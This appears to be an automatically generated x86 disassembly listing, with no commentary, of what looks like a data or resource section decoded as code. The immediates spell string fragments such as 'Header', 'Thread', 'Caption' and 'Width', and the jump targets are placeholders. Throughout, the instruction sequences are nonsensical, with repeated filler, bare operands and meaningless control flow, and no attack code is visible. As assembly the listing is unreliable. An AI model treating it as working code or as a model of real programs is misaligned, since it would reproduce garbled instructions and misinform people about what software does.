add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
insd
inc ebx
je r-xdata
inc ecx
inc ebx
add [ eax ] dl
popad
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
add al ch
xor eax [ eax ]
in al dx
add [ esi ] al
jo r-xdata
insb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dl
inc ebx
inc ebx
add [ ebx + eax * 2 + 0x43 ] bh
insb
jae r-xdata
add [ eax + 0x41 ] bh
inc ebx
add [ eax ] cl
sbb [ ebx + edx * 2 + 0x42 ] dl
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
inc ebx
popad
je r-xdata
add [ esi + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ ebx + 0x43 ]
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
inc edx
add ah ah
xor eax [ eax ]
les ecx [ esi ]
inc ebp
jbe r-xdata
inc ebx
add [ eax ] bh
add al [ eax ]
add [ eax ] bl
pop [ eax + eax - 0x3c ]
push cs
inc ebx
outsb
je r-xdata
add cl [ eax ]
sub_4344a2
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add ah bh
mov eax [ ebx ]
je r-xdata
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc esp
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_4348bf
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_4348e0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
js r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc esp
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
add [ ebx ] cl
je r-xdata
push edi
jo r-xdata
jb r-xdata
jo r-xdata
test [ eax + eax ] eax
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ eax ] al
sub [ ecx ] 0x0
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
inc ecx
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120026 ] al
outsb
inc ebx
jb r-xdata
inc esp
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
or cl [ edi + 0x6e ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
popad
je r-xdata
lea eax [ ebx ]
lodsb [ esi ]
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ ebx + 0x43 ]
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ch
dec ebx
inc ebx
add [ esi ] al
push 0x78655473
je r-xdata
jpe r-xdata
insb
je r-xdata
inc esp
outsd
ja r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
add [ ebx + eax * 2 ] cl
pop es
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
dec esp
inc ebx
add [ eax ] al
add [ eax ] al
mov eax eax
mov eax 0x434b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
dec ebx
inc ebx
inc ebx
outsd
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
mov es [ ebx ]
pushad
pop [ ecx ]
nop
pop [ ecx ]
mov [ edi - 0x72bbffbf ] cl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x8e
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
inc ecx
add [ eax - 0x53ffbc73 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
jb r-xdata
add [ eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
add al 0x85
inc esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ecx
add al bh
add [ eax ] al
sub [ ecx + 0xd80044 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
outsb
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
or [ ecx ] al
je r-xdata
adc [ eax ] al
push ds
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov eax 0x3800434b
pushad
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
insb
jae r-xdata
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec438bd8
fdiv [ ebx ]
inc esp
jb r-xdata
xor eax [ eax ]
loopne r-xdata
inc eax
add ah ch
jb r-xdata
add [ eax ] al
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc465646f
mov eax [ 0x200045 ]
add bh bh
ror [ edi + 0x10043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0004 ] al
insd
popad
dec ecx
outsb
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
jmp eax
inc ecx
add [ eax + eax ] ah
add bh bh
sbb [ esi - 0x71d3ffbd ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
insb
jae r-xdata
push ebx
je r-xdata
or ecx [ edi + 0x6e ]
sar [ eax + 0x434b ] 0x0
add [ eax ] al
add [ eax ] al
0x2800434b 0x0
sub al 0x4b
inc ebx
add [ ebx ] al
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
and eax 0x34ff0000
adc [ eax ] al
sbb [ eax ] al
add bh bh
add [ edi + 0x10043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x2710 ] al
add eax 0x614d0800
js r-xdata
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ eax + 0x1c004155 ] bh
add [ eax ] al
call eax
mov es [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ch
dec ebx
inc ebx
add [ eax ] ch
add [ eax ] al
add [ edi + ebx * 2 + 0x33d80041 ] ch
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x434df490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
dec esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] bl
inc ebx
add [ esi + ecx * 2 ] ah
inc ebx
add [ eax + eax ] bl
add [ eax ] al
pushad
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
outsb
je r-xdata
inc [ eax - 0x71 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov es [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x0
add bh bh
and al 0x8f
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0x34ff0000 ] ah
push 0x7000418b
mov eax [ ecx ]
mov al [ 0xffffffffac00438d ]
insb
add [ gs : eax ] eax
xchg ecx eax
inc ecx
add [ ecx ] al
add bh bh
push [ eax + edx * 4 ]
inc ebx
add [ edi ] cl
push esp
dec eax
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0x90
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
inc ecx
js r-xdata
push esp
or [ eax ] al
add eax 0x6c797453
xchg esp eax
adc [ eax ] al
or al 0x0
add bh bh
push eax
pop [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
add al 0x54
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2865646f
dec ebx
inc ebx
add [ 0x40ff0000 ] bl
pop [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x70 ] bh
inc ecx
add [ esp + edx * 4 - 0x6b3fffbf ] bh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ esp + edx * 4 - 0x6fc7ffbf ] dh
inc ebx
add [ eax ] dl
xchg ecx eax
inc ecx
add [ ecx + edx * 4 + 0x10041 ] cl
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4e ] ah
inc ebx
add [ esp + esi * 2 ] cl
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
outsb
je r-xdata
jb r-xdata
outsb
push esp
jb r-xdata
dec esi
inc ebx
add [ edi ] al
andps xmm1 [ eax + 0x65 ]
popad
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
inc ebp
jns r-xdata
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc esp
dec edi
inc ebx
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
jb r-xdata
dec ebp
inc ebx
add [ eax ] dl
popad
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
je r-xdata
outsb
je r-xdata
inc ebx
add ah bh
dec ebx
inc ebx
add [ ebx + 0x434facc0 ] cl
add [ eax ] cl
jbe r-xdata
jbe r-xdata
outsb
jb r-xdata
insd
dec eax
popad
arpl [ ebx + 0x45 ] bp
outsb
dec esi
outsd
je r-xdata
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
pop es
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add cl [ eax ]
or eax 0x64616548
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
insb
jae r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al bh
push edx
outsb
je r-xdata
add [ ebx + 0x434e64c0 ] cl
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add al bh
push edx
inc ebx
add ah bh
dec ebx
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + 0x4e ] ah
inc ebx
add [ ebx + 0x435044c0 ] cl
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] edx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
sar [ eax + 0x800434e ] 0x17
push esp
inc ebx
jne r-xdata
inc ebp
jbe r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
add [ ecx + edx ] al
inc eax
add ah bh
dec ebx
inc ebx
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
outsb
inc esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
je r-xdata
dec ebx
inc ebx
cld
je r-xdata
add ah bh
dec ebx
inc ebx
add [ eax ] al
adc [ eax ] al
nop
enter 0x4350 0x0
or [ eax ] ah
push esp
inc ebx
jne r-xdata
outsb
je r-xdata
insd
dec eax
popad
jb r-xdata
inc eax
add [ ecx + edx * 2 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
push ebx
je r-xdata
jb r-xdata
je r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
inc ebx
add ah bh
insd
inc esp
jb r-xdata
add al 0x8
push es
push ebx
add [ eax ] eax
outsd
outsb
je r-xdata
inc edx
add ah al
fmul [ esi ]
push edx
inc ebx
add [ eax + 0x2 ] bh
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
add [ eax ] al
nop
push edx
inc ebx
add al ah
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
inc ebp
add al cl
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc ebp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx * 2 ] dh
insb
add [ gs : eax ] eax
jb r-xdata
insd
dec eax
insd
dec eax
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add al bh
push edx
ja r-xdata
inc esp
add [ edi + ebx * 4 - 0x583ffbd ] bh
inc esp
outsb
jae r-xdata
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffbcae ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
outsd
insb
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
test [ ecx + 0x45a00043 ] dl
add al [ eax ]
add [ eax ] bl
pop [ eax + eax - 0x3c ]
push cs
je r-xdata
dec eax
popad
popad
je r-xdata
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
add al bh
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] bh
push ecx
inc ebx
add [ ebx ] al
or al 0x54
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + edx * 4 + 0x40b40043 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
insb
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov esp 0x4351
insd
inc ebx
je r-xdata
inc ebx
outsd
je r-xdata
inc ebp
inc ebx
add [ ecx ] cl
push 0x74754273
je r-xdata
add [ eax ] al
xor al 0x51
outsb
je r-xdata
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc ebx
add [ edx + edi * 8 + 0x44 ] bh
outsd
sub_435212
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x28 ] cl
pushfd
inc ebx
add al cl
hlt
sub_435236
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
fcom [ ecx + 0xc100043 ]
inc ebp
add [ eax ] cl
xchg ebx eax
inc ebx
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ eax - 0x6d ] dh
inc ebx
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
test [ edx - 0x5d43ffbd ] ah
inc ebx
add al dh
lahf
inc ebx
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
sub_435495
test al 0xf1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
dec eax
and al [ edx ]
push 0x80ff0000
rol [ eax + eax - 0x70 ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
add [ eax ] al
add [ eax + 0x46080013 ] al
jne r-xdata
mov [ 0x2280045 ] al
add bh bh
rol [ eax ] 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
insd
popad
jae r-xdata
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
inc esp
jb r-xdata
add [ eax + 0x49060017 ] al
jg r-xdata
outsd
outsb
je r-xdata
inc esi
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
outsb
jae r-xdata
add [ eax + eax ] dh
jmp [ eax - 0xa ]
add [ eax ] al
sbb [ ebx ] 0x0
push ecx
inc ebx
add [ edx + eax ] ch
add bh bh
in al dx
xchg esi eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5305001a ] al
je r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
je r-xdata
insb
les edx [ gs : eax + 0x43 ]
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
outsd
adc al 0x4f
outsb
inc ebx
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
add bh bh
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
je r-xdata
outsb
outsd
mov ah 0x4e
inc ebx
add [ eax + 0x2 ] al
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
jb r-xdata
je r-xdata
jpe r-xdata
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
rol [ eax + 0x8004356 ] 0x11
push esp
inc esp
jb r-xdata
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
pop eax
add al [ eax ]
[ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push cs
dec edi
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
ja r-xdata
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
test al 0x4f
inc ebx
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
popad
jb r-xdata
jae r-xdata
outsb
add [ ecx + ebx * 2 ] dl
inc ebx
add ah bh
dec ebx
inc ebx
ja r-xdata
push ebx
inc eax
dec edi
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
inc esp
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
dec edi
inc ebx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
push cs
push esp
dec eax
popad
jb r-xdata
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
push esp
dec eax
popad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + ebx * 2 ] dl
inc ebx
add ah bh
dec ebx
inc ebx
add [ ebx + 0x43575cc0 ] cl
pop es
jb r-xdata
jns r-xdata
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
adc [ eax ] al
lea eax [ eax ]
add [ edi + 0x43 ] dl
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
outsb
je r-xdata
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
or [ 0x64616548 ] cl
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
imul eax [ ebp + 0x76 ] 0x65
outsd
outsb
je r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
jbe r-xdata
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
add [ eax ] cl
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
mov eax eax
pop esp
push edi
inc ebx
jbe r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
